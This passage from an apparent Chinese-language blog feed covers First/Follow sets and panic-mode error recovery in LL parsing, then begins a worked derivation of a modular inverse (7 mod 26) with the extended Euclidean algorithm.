class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>T</mi><mo mathvariant="normal">′</mo></msup><mo>→</mo><mo>∗</mo><mi>F</mi><msup><mi>T</mi><mo mathvariant="normal">′</mo></msup><mi mathvariant="normal">∣</mi><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">T&#x27; \rightarrow *FT&#x27; | \epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord">∗</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord mathdefault">ϵ</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>F</mi><mo>→</mo><mo stretchy="false">(</mo><mi>E</mi><mo stretchy="false">)</mo><mi mathvariant="normal">∣</mi><mi>i</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">F \rightarrow (E) | id</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mclose">)</span><span class="mord">∣</span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span></span></span></span></p><p>例子说使用First 和 Follow集作为同步集合。实际上书上只用了Follow集，这里我们来 求一下E T 和F的follow集。</p><p>先求First集。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>F</mi><mi>i</mi><mi>r</mi><mi>s</mi><mi>t</mi><mo stretchy="false">(</mo><mi>E</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">{</mo><mo stretchy="false">(</mo><mo separator="true">,</mo><mi>i</mi><mi>d</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">First(E)=\{(,id\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mopen">(</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span><span class="mclose">}</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>F</mi><mi>i</mi><mi>r</mi><mi>s</mi><mi>t</mi><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">{</mo><mo stretchy="false">(</mo><mo separator="true">,</mo><mi>i</mi><mi>d</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">First(T)=\{(,id\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mopen">(</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span><span class="mclose">}</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>F</mi><mi>i</mi><mi>r</mi><mi>s</mi><mi>t</mi><mo stretchy="false">(</mo><mi>F</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">{</mo><mo stretchy="false">(</mo><mo separator="true">,</mo><mi>i</mi><mi>d</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">First(F)=\{(,id\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mopen">(</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span><span class="mclose">}</span></span></span></span></p><p>再后Follow集。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>F</mi><mi>o</mi><mi>l</mi><mi>l</mi><mi>o</mi><mi>w</mi><mo stretchy="false">(</mo><mi>E</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">{</mo><mo stretchy="false">)</mo><mo separator="true">,</mo><mi mathvariant="normal">$</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">Follow(E)=\{), \$\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">$</span><span class="mclose">}</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>F</mi><mi>o</mi><mi>l</mi><mi>l</mi><mi>o</mi><mi>w</mi><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo><mo>=</mo><mi>F</mi><mi>i</mi><mi>r</mi><mi>s</mi><mi>t</mi><mo stretchy="false">(</mo><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup><mo stretchy="false">)</mo><mo>∪</mo><mi>F</mi><mi>o</mi><mi>l</mi><mi>l</mi><mi>o</mi><mi>w</mi><mo stretchy="false">(</mo><mi>E</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">{</mo><mo>+</mo><mo separator="true">,</mo><mo stretchy="false">)</mo><mo separator="true">,</mo><mi mathvariant="normal">$</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">Follow(T)=First(E&#x27;)\cup Follow(E)=\{+, ), \$\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">+</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">$</span><span class="mclose">}</span></span></span></span></p><blockquote><p>因为在第一个产生式中E’在T后面，而E’ 可能会推导为空串，则E的follow集需要加入到follow(T)中</p><p>值得注意的是，貌似follow集 中是不考虑空串的，需要手动去掉。</p></blockquote><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>F</mi><mi>o</mi><mi>l</mi><mi>l</mi><mi>o</mi><mi>w</mi><mo stretchy="false">(</mo><mi>F</mi><mo stretchy="false">)</mo><mo>=</mo><mi>F</mi><mi>i</mi><mi>r</mi><mi>s</mi><mi>t</mi><mo stretchy="false">(</mo><msup><mi>T</mi><mo mathvariant="normal">′</mo></msup><mo stretchy="false">)</mo><mo>∪</mo><mi>F</mi><mi>o</mi><mi>l</mi><mi>l</mi><mi>o</mi><mi>w</mi><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">{</mo><mo>∗</mo><mo separator="true">,</mo><mo>+</mo><mo separator="true">,</mo><mo stretchy="false">)</mo><mo separator="true">,</mo><mi mathvariant="normal">$</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">Follow(F)=First(T&#x27;)\cup Follow(T)=\{*, +, ), \$\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">∗</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">+</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">$</span><span class="mclose">}</span></span></span></span></p><p>我们可以看到上面图中表sync的符号就是 E T F对应follow集中的符号。</p><blockquote><p>这里解释一下用follow集的合理性。同步词法单元就程序结构结束的标志。而follow集标识某个语法变量后面紧跟着的终结符号，遇到终极终极符号了，自然说明这个语法变量的作用域已经结束了。</p><p>同时要注意follow集中的那个终极符号不是这个结构里的内容，而属于下个结构的开始符号。</p></blockquote><p>然后我们实际来恐慌处理一个错误输入 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>+</mo><mi>i</mi><mi>d</mi><mo>∗</mo><mo>+</mo><mi>i</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">+id*+id</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord">+</span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord">+</span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span></span></span></span></p><p><img src="https://upyun.wuuconix.link/image-20211111232809526.png" alt="实际处理" /></p><p>开局E与+，表中为空，即+不是Follow(E)中的符号。直接忽略+。</p><p>然后一路顺畅，到了F与+。一看发现是sync。ok，弹出非终结符号F。</p><blockquote><p>为什么不把+也弹掉呢？因为+是follow(F)。属于下个结构里的开始符号，不是F的作用域。</p><p>删除输入符号即忽略输入符号只出现在表格中为空时，这正是恐慌处理正在干的事情。</p></blockquote><p>实际这个例子没有体现出恐慌性，因为我们发现F非常牛，它要么是正确推导，要么就是synch。因为它的follow集很多。</p><p>实际上恐慌体现在遇到表中为空格的情况，因为每次遇到空格，我们就需要丢弃输入的字符，去看下一个输入字符。当我们遇到一个sync的时候，实际上恐慌已经结束了。</p><h3 id="短语层次的恢复"><a class="markdownIt-Anchor" href="#短语层次的恢复"></a> 短语层次的恢复</h3><ul><li>在预测语法分析表的空白条目中插入错误处理例程的函数指针</li><li>例程可以改变、插入或删除输入中的符号，发出适当的错误消息。</li></ul><p><img src="https://upyun.wuuconix.link/image-20211111235003584.png" alt="递归子程序法" /></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>complier</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>模逆——拓展欧几里得</title>
    <link href="/2021/09/29/exgcd/"/>
    <url>/2021/09/29/exgcd/</url>
    
    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header>    <div id="aplayer-EmQjBhVy" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="1878900082" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"    ></div><h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2><p>在准备用python实现AES的时候，遇到了求伽罗华域下一个多项式的逆的问题。我发现，我不光把域的知识忘光了，别说多项式的逆了，我连如何用python实现求一个整数的逆都不知道。</p><p>我只了解手动手动推的过程，主要利用到了贝组等式和欧几里得的逆推。</p><h2 id="手动推的过程"><a class="markdownIt-Anchor" href="#手动推的过程"></a> 手动推的过程</h2><p>基于贝组等式<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mi>x</mi><mo>+</mo><mi>b</mi><mi>y</mi><mo>=</mo><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">ax+by = gcd(a,b)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">a</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">b</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">c</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">b</span><span class="mclose">)</span></span></span></span>有解。</p><p>比如我们这里求a在模b意义下的逆c。</p><p>因为逆如果存在，则a和b的最大公因数一定是1。</p><p>贝组等式变成了这样：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mi>x</mi><mo>+</mo><mi>b</mi><mi>y</mi><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">ax+by=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">a</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">b</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></p><p>这时候，我们如果等式两边同时模b。</p><p>就变成了<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mi>x</mi><mo>=</mo><mn>1</mn><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>b</mi></mrow><annotation encoding="application/x-tex">ax = 1\ mod\ b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">b</span></span></span></span>。</p><p>那x不就是我们要求的a在模b意义下的逆了嘛！</p><p>所以转化一下思路，我们只要求出了贝组等式中的x，那么我们就求出了a的逆！</p><p>所以这个问题实际上是一个二元一次方程式求解的问题。</p><p>在大二下半学期的数学基础课程中，我做为530知名做题家之一，已经牢牢记住了这个x是怎么求的。</p><p>下面拿求 7 在 模 26 下的逆做例子。</p><ol><li><p>首先我们写出辗转相除法的所有推导过程。</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">26 </span>= <span class="hljs-number">3</span> * <span class="hljs-number">7</span> + <span class="hljs-number">5</span><br><span class="hljs-symbol">7 </span> = <span class="hljs-number">1</span> * <span class="hljs-number">5</span> + <span class="hljs-number">2</span><br><span class="hljs-symbol">5 </span> = <span class="hljs-number">2</span> * <span class="hljs-number">2</span> + <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li><li><p>然后从最后一个式子<code>5 = 2 * 2 + 1</code>出发，把1移到一边，另外的移到另一边。</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>= <span class="hljs-number">5</span> - <span class="hljs-number">2</span> * <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure></li><li><p>之后把2 用移项后的第二个式子<code>2 = 7 - 1 * 5</code>进行代替</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>= <span class="hljs-number">5</span> - <span class="hljs-number">2</span> * (<span class="hljs-number">7</span> - <span class="hljs-number">1</span> * <span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure><p>整理一下。</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>= -<span class="hljs-number">2</span> * <span class="hljs-number">7</span> + <span class="hljs-number">3</span> * <span class="hljs-number">5</span><br></code></pre></td></tr></table></figure></li><li><p>接下来，类似的，再把5换掉。</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>= -<span class="hljs-number">2</span> * <span class="hljs-number">7</span> + <span class="hljs-number">3</span> * (<span class="hljs-number">26</span> - <span class="hljs-number">3</span> * <span class="hljs-number">7</span>)<br></code></pre></td></tr></table></figure><p>整理</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>= <span class="hljs-number">3</span> * <span class="hljs-number">26</span> - <span class="hljs-number">11</span> * <span class="hljs-number">7</span><br></code></pre></td></tr></table></figure><p>是不是很熟悉了？两边再换一下位置！</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">3 </span>* <span class="hljs-number">26</span> - <span class="hljs-number">11</span> * <span class="hljs-number">7</span> = <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>这不就是贝组等式嘛！而且 7 前面的 系数我们也知道了，是 -11，也就是15</p><p>所以 15 就是 7 的逆了。</p><p><img src="https://upyun.wuuconix.link/image-20210929223156774.png" alt="7's inverse" /></p></li></ol><h2 id="思考"><a class="markdownIt-Anchor" href="#思考"></a> 思考</h2><p>上面手动推导的过程实际上是利用已有的一些式子（求gcd写的一些式子）来进行变量替换，从<code>1 * 5 - 2 * 2 = 1</code>最终变为了<code>3 * 26 - 11 * 7 = 1</code>。</p><p>如果用算法完全模拟这个过程，我们首先要生成并保存这些式子，然后进行一些替换，感觉实现起来充满了繁琐。</p><p>所以我们需要简化这个过程，最好能找出每一组的关系，得到某个简单的关系来进行迭代。就像<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo><mo>=</mo><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><mi>b</mi><mo separator="true">,</mo><mi>a</mi><mi mathvariant="normal">%</mi><mi>b</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">gcd(a,b)=gcd(b,a\% b)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">c</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">c</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord mathdefault">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">a</span><span class="mord">%</span><span class="mord mathdefault">b</span><span class="mclose">)</span></span></span></span>这种漂亮的式子一样。</p><p>这种关系，拓展欧几里得算法<code>Extended Euclidean algorithm</code>给出来了。这里 主要参考了知乎大佬<a href="https://www.zhihu.com/question/30067108/answer/809673564">不抱怨的世界</a>的回答。</p><p>这里写一下我理解的推导出两个式子之间关系的过程。</p><p>我们仔细观察手动推出的中间式子，去掉那些因为替换变量产生的中间式子，可以得到以下一些重要的式子。</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>=  <span class="hljs-number">1</span> * <span class="hljs-number">1</span> +  <span class="hljs-number">0</span>  * <span class="hljs-number">0</span><br><span class="hljs-symbol">1 </span>=  <span class="hljs-number">0</span> * <span class="hljs-number">2</span> +  <span class="hljs-number">1</span>  * <span class="hljs-number">1</span><br><span class="hljs-symbol">1 </span>=  <span class="hljs-number">1</span> * <span class="hljs-number">5</span>  - <span class="hljs-number">2</span>  * <span class="hljs-number">2</span><br><span class="hljs-symbol">1 </span>= -<span class="hljs-number">2</span> * <span class="hljs-number">7</span>  + <span class="hljs-number">3</span>  * <span class="hljs-number">5</span><br><span class="hljs-symbol">1 </span>=  <span class="hljs-number">3</span> * <span class="hljs-number">26</span> - <span class="hljs-number">11</span> * <span class="hljs-number">7</span><br></code></pre></td></tr></table></figure><p>这些式子分别是1与0、2与1、5与2、7与5的贝组等式和我们要求的26和7的贝组等式。</p><p>所以我们实际上是从一个贝组等式出发，经过某种规律得到了上一个贝组等式，逐步推导得到了我们需要的贝组等式，从而求出逆。</p><p>我们的注意点应该放在前面的系数上，也就是x和y上，因为我们最后求得逆就是这个系数。</p><p>这里列两个贝组等式。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mi>x</mi><mo>+</mo><mi>b</mi><mi>y</mi><mo>=</mo><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">ax+by=gcd(a,b)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">a</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" 